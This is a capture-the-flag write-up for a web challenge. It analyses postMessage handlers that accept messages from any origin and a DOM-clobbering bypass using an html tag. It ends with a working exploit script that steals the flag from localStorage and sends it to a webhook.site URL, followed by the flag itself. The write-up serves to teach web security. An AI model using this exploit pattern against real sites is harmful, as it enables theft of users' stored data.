---
tags: 
references:
---
# Nrr
Solves: 
Tags: #posmessage #dom-clobbering 
## Description
> Neon lights make the perfect retro-futuristic aesthetic. Unfortunately, they also burn out quickly and are difficult to replace. Neon Repair Reminder is a simple, easy-to-use, app reminder to keep track of your neon lights and when they need to be replaced. Don't let your neon lights burn you out!
  
  _Caution: Flashing Background Image_
## Overview
It's a page that renders given text.
## Code review
The app's code is simple:
### Backend
- Security headers - the CSP makes XSS difficult.
```python
@app.after_request
def add_security_headers(response):
    response.headers['Content-Security-Policy'] = "default-src 'self' 'sha256-zmo7m+pxoKmTCo7b6iPzuuTrB58B1BO0LXqxnieruZk=' 'sha256-3WkAtsLk8Uq+8ttNpYWR+BjKfMRX1hdGZfHI2RICtaE='; frame-ancestors 'none'; frame-src 'self' blob:"
    response.headers['X-Content-Type-Options'] = 'nosniff'
    return response
```
- The bot can open any given url
```python
if (url.startswith('https://') or url.startswith('http://')): # and verify_pow(pow_chal, session.get('challenge')):
	Q.enqueue(visit, url)
```
And sets the flag in the localstorage
```python
page.goto(APP_URL, timeout=PAGE_TIMEOUT)
expect(page).to_have_title('Neon Repair Reminder')
page.evaluate(
	"""() => {
		localStorage.setItem('reminder', '""" + FLAG + """"');
	}"""
)
sleep(1)

try:
	page.goto(url, timeout=4000)
	sleep(5)
```
### Frontend
- `nrr.js` - creates two iframes:
	- a **valut** that acts like a storage, on postmessage stores or gets a reminder stored in the localstorage
	- a **renderer** that writes some given data into a shadow-dom element. is **sandboxed** with `allow-scripts`
```js
async function createRenderer() {
    const blobData = `renderer_code`;
    return await createIframe(URL.createObjectURL(new Blob([blobData], { type: 'text/html' })), 'reminderRenderer', {
        sandbox: 'allow-scripts'
    });
}

async function createVault() {
    const blobData = `vault_code`;
    return await createIframe(URL.createObjectURL(new Blob([blobData], { type: 'text/html' })), 'reminderVault', {});
}

window.addEventListener('load', async (event) => {
    const tReminder = document.getElementById('reminderInput');
    const bSave = document.getElementById('saveButton');
    const bRenderer = document.getElementById('rendererButton');
    const bExport = document.getElementById('exportButton');

    const iVault = await createVault();
    let iRenderer = await createRenderer();
```

- `valult` - listens for postmessages and does something based on the event type:
	- **append-reminder** -> set `reminder` in the localStorage
	- **get-reminder** -> send `reminder` to the second frame in the parent page
```html
<html>
    <body>
		<script>
		window.addEventListener('message', (event) => {
		    if (event.data.type === 'append-reminder' || event.data.reminder) {
		        localStorage.setItem("reminder", (localStorage.getItem("reminder") || "") + event.data.reminder);
		    }
		    if (event.data.type === 'get-reminder' && event.source === window.parent.frames[1]) {
		        window.parent.frames[1].postMessage({ type: "render", export: event.data.export, reminder: localStorage.getItem("reminder") || "" }, "*");
		    }
		});
		</script>
    </body>
</html>
```

- `renderer` - listens for postmessages and does something based on the event type:
	- **render-reminder** -> gets the reminder from the first frame in the parent page, and inserts it in a shadow DOM element.
	  plus if the source of the postmessage is the first frame, the reminder gets written directly in the document.
```html
<html>
    <body>
        <div id="shadowHost"></div>
		<script>
		let winApp;
		window.addEventListener('message', (event) => {
		    if (event.data.type === 'render-reminder' || event.data.type === 'export-reminder') {
		        winApp = event.source;
		        window.parent.frames[0].postMessage({ type: "get-reminder", export: event.data.type === 'export-reminder'}, "*");
		    }
		    if (event.data.type === "render" && event.source === window.parent.frames[0]) {
		        const host = document.querySelector("#shadowHost");
		        const shadow = host.attachShadow({ mode: "open" });
		        host.shadowRoot.innerHTML = event.data.reminder;
		        if (shadow.childNodes.length === 1 && shadow.childNodes[0].nodeType === Node.TEXT_NODE) {
		            try {
		                document.write(event.data.reminder);
		                if (event.data.export && exportEnabled) {
		                    winApp.postMessage({ type: "export", reminder: event.data.reminder }, "*");
		                }
		            } catch(e) {}
		        } else {
		            host.shadowRoot.innerHTML = '';
		        }
		        host.remove();
		    }
		});
		</script>
    </body>
</html>
```

All the postmessages handler accept messages from any origin.
## Exploitation

- append dom clobbering payload to the reminder
- send a message to the renderer to set winApp to my page -> receive the flag

problem: exportEnabled has to be set -> dom clobbering
prolem for dom clobbering: `shadow.childNodes[0].nodeType === Node.TEXT_NODE` allows only text nodes
finding html tags that satisfy this condition

```js
    const host = document.querySelector("#shadowHost");
    const notshadow = document.querySelector("#notshadow");
    const shadow = host.attachShadow({ mode: "open" });
    let base = "aa"
    let tags = ["html","head","title","base","link","meta","style","body","address","article","aside","footer","header","h1","h2","h3","h4","h5","h6","hgroup","main","nav","section","blockquote","dd","div","dl","dt","figcaption","figure","hr","li","ol","p","pre","ul","a","abbr","b","bdi","bdo","br","cite","code","data","dfn","em","i","kbd","mark","q","rp","rt","ruby","s","samp","small","span","strong","sub","sup","time","u","var","wbr","area","audio","img","map","track","video","embed","iframe","object","param","picture","source","canvas","noscript","script","del","ins","table","caption","col","colgroup","tbody","td","tfoot","th","thead","tr","button","datalist","fieldset","form","input","label","legend","meter","optgroup","option","output","progress","select","textarea","details","dialog","summary","slot","template"]

    for (let tag of tags) {
        shadow.innerHTML = `${base}<${tag} id=test>${base}</${tag}>`;
        if (host.shadowRoot.childNodes.length === 1 && host.shadowRoot.childNodes[0].nodeType === Node.TEXT_NODE) {
            console.log("can write shadow", tag);
            notshadow.innerHTML = `${base}<${tag} id=test>${base}</${tag}>`;
            try {
                if (test) {
                    console.log("can also clobber", tag);
                }
            } catch(e) {}
        }
    }
```
`html` clobbers successfully

Exploit:
```js
    let w = open("https://g9wrqg8opql4s1pv.dyn.acsc.land/");
    setTimeout(() => {
        w.frames[0].postMessage({ type: "append-reminder", reminder: "<html id=exportEnabled></html>"}, '*'); // dom clobber
        w.frames[1].postMessage({ type: "export-reminder" }, '*'); // set win + render the flag
    }, 1000);
    window.addEventListener("message", (e) => {
        if (e.data.type === "export") {
            console.log("export", e.data.reminder);
            location = "https://webhook.site/ad2e555f-63b2-41df-b262-81a89e99c4aa/?c="+encodeURIComponent(e.data.reminder);
        }
    });

```


`dach2025{d0_u_th1nk_ther3s_any_h0pe_for_th3_web_hwu97fwet2fsi934}`